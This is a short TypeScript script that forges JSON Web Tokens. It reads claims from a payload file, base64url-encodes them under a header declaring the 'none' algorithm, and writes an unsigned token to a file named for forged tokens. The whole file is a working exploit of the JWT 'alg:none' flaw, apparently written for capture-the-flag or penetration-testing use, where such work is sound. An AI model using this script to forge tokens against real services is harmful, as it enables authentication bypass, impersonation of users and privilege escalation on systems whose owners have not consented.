import fs from 'fs';
import { fileURLToPath } from 'url';
import path from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const file_input = path.join(__dirname,'payload.txt');
const file_output = path.join(__dirname,'output_forge_token.txt');

const input_payload:string = fs.readFileSync(file_input,"utf-8");

function base64(input:string):string|undefined{
    try {
        const buffer = Buffer.from(input)
        .toString("base64")
        .replace(/=/g, "")
        .replace(/\+/g, "-")
        .replace(/\//g, "_");
        return buffer;
    } catch (error) {
        console.error(error);
    }
};



const head:{
    alg:'none',
    typ:'JWT'
}=
{ 
    alg:'none',
    typ:'JWT',
};



const get_token = ():void=>{
    try {
        const encode_head = base64(JSON.stringify(head));
        const encode_payload = base64(input_payload);
        const token = `${encode_head}.${encode_payload}.`;
        fs.writeFileSync(file_output,token);
    } catch (error) {
        console.error(error);
    }
};

get_token()